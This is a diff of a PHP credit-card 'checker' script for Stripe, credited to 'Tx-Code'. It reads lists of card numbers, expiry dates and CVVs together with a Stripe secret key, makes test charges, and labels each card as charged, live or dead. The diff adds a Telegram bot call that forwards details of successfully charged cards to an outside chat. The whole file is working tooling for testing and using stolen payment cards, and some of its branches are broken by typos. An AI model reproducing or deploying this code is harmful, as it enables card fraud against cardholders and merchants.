@@ -1,13 +1,14 @@
 <?php
 
 
-
+//===================== [ MADE BY Tx-Code ] ====================//
+#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
 
 
 
 error_reporting(0);
 date_default_timezone_set('America/Buenos_Aires');
-$start = microtime(true);
+
 
 //================ [ FUNCTIONS & LISTA ] ===============//
 
@@ -27,12 +28,17 @@ function multiexplode($seperator, $string){
     return $two;
     };
 
-$idd = $_GET['idd'];
+if(isset($_GET['cst'])){
+
 $amt = $_GET['cst'];
-if(empty($amt)) {
-	$amt = '1';
-	$chr = $amt * 100;
 }
+if(empty($amt)) {
+    $amt = '1';
+}
+    $chr = $amt * 100;
+
+$idd = $_GET['idd'];
+
 $sk = $_GET['sec'];
 $lista = $_GET['lista'];
     $cc = multiexplode(array(":", "|", ""), $lista)[0];
@@ -49,329 +55,254 @@ if (strlen($ano) == 2) $ano = "20$ano";
 
 //================= [ CURL REQUESTS ] =================//
 
-#-------------------[1st REQ]--------------------#
-$x = 0;  
-
-while(true)  
-
-{  
-
+#-------------------[1st REQ]--------------------#  
+  
 $ch = curl_init();  
-
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
-
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
-
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
-
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
-
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
-
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');  
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.''); 
 $result1 = curl_exec($ch);  
-
 $tok1 = Getstr($result1,'"id": "','"');  
-
 $msg = Getstr($result1,'"message": "','"');  
-
 //echo "<br><b>Result1: </b> $result1<br>";  
 
-if (strpos($result1, "rate_limit"))   
-
-{  
-
-    $x++;  
-
-    continue;  
-
-}  
-
-break;  
-
-}
-#-------------------[2nd REQ]--------------------#
-
-$x = 0;  
-
-while(true)  
-
-{  
+  
+#------------------[2nd REQ]--------------------#  
 
 $ch = curl_init();  
-
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
-
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
-
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
-
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
-
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
-
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=SYNZX Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Tx-Code Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
 $result2 = curl_exec($ch);  
-
 $tok2 = Getstr($result2,'"id": "','"');  
-
 $receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
-
 //echo "<br><b>Result2: </b> $result2<br>";  
-
-if (strpos($result2, "rate_limit"))   
-
-{  
-
-    $x++;  
-
-    continue;  
-
-}  
-
-break;  
-
-}
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Host: lookup.binlist.net',
-'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
-));
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, '');
-$fim = curl_exec($ch);
-$bank = getStr($fim, '"bank":{"name":"', '"');
-$name = getStr($fim, '"name":"', '"');
-$brand = getStr($fim, '"brand":"', '"');
-$country = getStr($fim, '"country":{"name":"', '"');
-$scheme = getStr($fim, '"scheme":"', '"');
-$currency = getStr($fim, '"currency":"', '"');
-$emoji = getStr($fim, '"emoji":"', '"');
-$type = getStr($fim, '"type":"', '"');
-if(strpos($fim, '"type":"credit"') !== false) {
-$bin = 'Credit';
-}else {
-$bin = 'Debit';
-}
-
-#########################[Randomizing Details]############################
 
 
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-   
-    
-  
-    echo '<span><font size=3.5 color="white"><font class="badge badge-success"> '.$amt.' 𝗖VV 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ 𝗕𝗬 WABOU  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a> </font> </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"></span>   <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font>  <font class="badge badge-primary">『 🔥 Join 🐉PHC @PHCORNER🔥 』 </font></font><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' Charged ✅ <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+$tg2 = 
+" CHARGED: <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀: $ ".$amt." 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 𝘾𝙑𝙑 ";
+
+$apiToken = '';
+$forward1 = ['chat_id' => '','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+
+
+
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE</i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
 }
 
+
 elseif(strpos($result1, "generic_decline")) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
     }
 elseif(strpos($result2, "generic_decline" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
 }
 elseif(strpos($result2, "insufficient_funds" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED INSUFF★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
 }
 
 elseif(strpos($result2, "fraudulent" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
 }
-elseif(strpos($resul3, "do_not_honor" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';}
-elseif(strpos($resul2, "do_not_honor" )) {
+elseif(strpos($resultl3, "do_not_honor" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+    }
+elseif(strpos($resultl2, "do_not_honor" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
 elseif(strpos($result,"fraudulent")){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
 
 }
 
 elseif(strpos($result2,'"code": "incorrect_cvc"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-success">CCN LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CCN★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
 }
 elseif(strpos($result1,' "code": "invalid_cvc"')){
-    echo '<font size=3.5 color="white"><font class="badge badge-success">CCN LIVE </i></font> <font class="badge badge-success">'.$lista.'<L</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CCN MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
      
 }
 elseif(strpos($result1,"invalid_expiry_month")){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID DATE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';
 
 }
 elseif(strpos($result2,"invalid_account")){
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID ACC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';
 
 }
 
 elseif(strpos($result2, "do_not_honor")) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT HONOR CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
 elseif(strpos($result2, "lost_card" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
 }
 elseif(strpos($result2, "lost_card" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">LOST CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY ITSSWAGGER</span> <br>';
 }
 
 elseif(strpos($result2, "stolen_card" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
     }
 
 elseif(strpos($result2, "stolen_card" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
 
 
 }
 elseif(strpos($result2, "transaction_not_allowed" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★FOR TRIALS ONLY★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』 </font><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
     }
     elseif(strpos($result2, "authentication_required")) {
-    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
    } 
    elseif(strpos($result2, "card_error_authentication_required")) {
-    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
    } 
    elseif(strpos($result2, "card_error_authentication_required")) {
-    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
    } 
    elseif(strpos($result1, "card_error_authentication_required")) {
-    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
    } 
 elseif(strpos($result2, "incorrect_cvc" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CCN</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
 }
 elseif(strpos($result2, "pickup_card" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
 }
 elseif(strpos($result2, "pickup_card" )) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PICKUP CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
 
 }
 elseif(strpos($result2, 'Your card has expired.')) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
 }
 elseif(strpos($result2, 'Your card has expired.')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">EXPIRED CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
 
 }
 elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
-	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">RATE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
 }
 elseif(strpos($result2, '"code": "processing_error"')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PROCESS ERROR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
     }
 elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
-    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥 Join 🐉PHCORNER @PHC 🔥 』</font><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
     }
 elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
